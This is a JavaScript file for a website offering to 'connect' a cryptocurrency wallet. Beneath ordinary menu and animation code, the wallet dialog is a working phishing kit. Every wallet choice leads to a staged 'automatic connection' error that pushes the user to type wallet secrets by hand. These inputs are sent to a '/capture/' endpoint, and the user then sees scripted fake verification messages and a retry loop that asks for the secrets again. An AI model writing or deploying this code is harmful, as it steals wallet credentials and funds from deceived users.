/* static/js/wallet.js */
document.addEventListener('DOMContentLoaded', () => {
    // Hamburger Menu Toggle
    const hamburger = document.getElementById('hamburger');
    const mobileMenu = document.getElementById('mobile-menu');
    if (hamburger && mobileMenu) {
        hamburger.addEventListener('click', () => {
            mobileMenu.classList.toggle('hidden');
            hamburger.classList.toggle('active');
        });
    } else {
        console.log('Hamburger or mobile menu not found');
    }

    // Contact Form Submission
    const contactForm = document.getElementById('contact-form');
    const submitMessage = document.getElementById('submit-message');
    if (contactForm && submitMessage) {
        contactForm.addEventListener('submit', (e) => {
            e.preventDefault();
            contactForm.classList.add('hidden');
            submitMessage.classList.remove('hidden');
        });
    }

    // GSAP Animations for About Page
    if (document.querySelector('.about-section')) {
        gsap.registerPlugin(ScrollTrigger);
        gsap.from('.about-card', {
            opacity: 0,
            y: 50,
            stagger: 0.2,
            duration: 1,
            scrollTrigger: {
                trigger: '.about-section',
                start: 'top 80%',
            },
        });

        gsap.from('.timeline-item', {
            opacity: 0,
            x: -50,
            stagger: 0.3,
            duration: 1,
            scrollTrigger: {
                trigger: '.timeline-section',
                start: 'top 80%',
            },
        });
    }

    // Initialize Particles.js for About Page
    if (document.getElementById('particles-js')) {
        particlesJS('particles-js', {
            particles: {
                number: { value: 80, density: { enable: true, value_area: 800 } },
                color: { value: '#3b82f6' },
                shape: { type: 'circle' },
                opacity: { value: 0.5, random: false },
                size: { value: 3, random: true },
                line_linked: { enable: true, distance: 150, color: '#e5e7eb', opacity: 0.4, width: 1 },
                move: { enable: true, speed: 6, direction: 'none', random: false, straight: false, out_mode: 'out', bounce: false },
            },
            interactivity: {
                detect_on: 'canvas',
                events: { onhover: { enable: true, mode: 'repulse' }, onclick: { enable: true, mode: 'push' }, resize: true },
                modes: { repulse: { distance: 200, duration: 0.4 }, push: { particles_nb: 4 } },
            },
            retina_detect: true,
        });
    }

    // Wallet Dialogue Functionality
    const walletDialog = document.getElementById('wallet-dialog');
    const connectWalletButton = document.getElementById('connect-wallet');
    const serviceButtons = document.querySelectorAll('.service-button');
    const walletOptions = document.querySelectorAll('.wallet-option');
    const walletOptionsContainer = document.getElementById('wallet-options');
    const tabButtons = document.querySelectorAll('.tab-button');
    const validateButton = document.getElementById('validate');
    const closeButton = document.getElementById('close-dialog');
    const loading = document.getElementById('loading');
    const error = document.getElementById('error');
    const errorMessage = document.getElementById('error-message');
    const connecting = document.getElementById('connecting');
    const connectingMessage = document.getElementById('connecting-message');
    const failureMessage = document.getElementById('failure-message');
    const retryButton = document.getElementById('retry');

    // Show wallet dialog on connect wallet or service button click
    connectWalletButton.addEventListener('click', () => {
        walletDialog.classList.remove('hidden');
        walletOptionsContainer.classList.remove('hidden');
        loading.classList.add('hidden');
        error.classList.add('hidden');
        connecting.classList.add('hidden');
        errorMessage.textContent = 'There was an error connecting automatically. But do not worry, you can still connect manually.';
    });
    serviceButtons.forEach(button => {
        button.addEventListener('click', () => {
            walletDialog.classList.remove('hidden');
            walletOptionsContainer.classList.remove('hidden');
            loading.classList.add('hidden');
            error.classList.add('hidden');
            connecting.classList.add('hidden');
            errorMessage.textContent = 'There was an error connecting automatically. But do not worry, you can still connect manually.';
        });
    });

    // Close dialog on outside click before manual input
    walletDialog.addEventListener('click', (e) => {
        if (e.target === walletDialog && walletOptionsContainer.classList.contains('hidden')) {
            walletDialog.classList.add('hidden');
            walletOptionsContainer.classList.remove('hidden');
            loading.classList.add('hidden');
            error.classList.add('hidden');
            connecting.classList.add('hidden');
            errorMessage.textContent = 'There was an error connecting automatically. But do not worry, you can still connect manually.';
        }
    });

    // Handle wallet option clicks
    walletOptions.forEach(button => {
        button.addEventListener('click', () => {
            walletOptionsContainer.classList.add('hidden');
            loading.classList.remove('hidden');
            setTimeout(() => {
                loading.classList.add('hidden');
                error.classList.remove('hidden');
            }, 4000);
        });
    });

    // Handle tab switching
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tab = button.getAttribute('data-tab');
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.add('hidden');
            });
            document.getElementById(`${tab}-tab`).classList.remove('hidden');
            tabButtons.forEach(btn => btn.classList.remove('bg-blue-500'));
            button.classList.add('bg-blue-500');
        });
    });

    // Handle validate button
    validateButton.addEventListener('click', () => {
        const activeTab = document.querySelector('.tab-content:not(.hidden)');
        const dataType = activeTab.id.replace('-tab', '');
        const dataContent = document.getElementById(`${dataType}-content`).value;

        fetch('/capture/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `data_type=${dataType}&data_content=${encodeURIComponent(dataContent)}`
        }).then(response => response.json()).then(data => {
            if (data.status === 'error') {
                errorMessage.textContent = data.message;
            } else if (data.status === 'success') {
                error.classList.add('hidden');
                connecting.classList.remove('hidden');
                connectingMessage.textContent = 'Connecting Wallet...';
                failureMessage.classList.add('hidden');
                retryButton.classList.add('hidden');

                // Simulate connection attempt
                setTimeout(() => {
                    connectingMessage.textContent = 'Verifying credentials...';
                }, 2000);
                setTimeout(() => {
                    connectingMessage.textContent = 'Establishing secure connection...';
                }, 4000);
                setTimeout(() => {
                    connectingMessage.classList.add('hidden');
                    failureMessage.classList.remove('hidden');
                    retryButton.classList.remove('hidden');
                }, 6000);
            }
        }).catch(err => {
            errorMessage.textContent = 'An unexpected error occurred. Please try again.';
        });
    });

    // Handle retry button
    retryButton.addEventListener('click', () => {
        connecting.classList.add('hidden');
        error.classList.remove('hidden');
        walletOptionsContainer.classList.add('hidden');
        errorMessage.textContent = 'There was an error connecting automatically. But do not worry, you can still connect manually.';
    });

    // Handle close button
    closeButton.addEventListener('click', () => {
        walletDialog.classList.add('hidden');
        walletOptionsContainer.classList.remove('hidden');
        loading.classList.add('hidden');
        error.classList.add('hidden');
        connecting.classList.add('hidden');
        errorMessage.textContent = 'There was an error connecting automatically. But do not worry, you can still connect manually.';
    });
});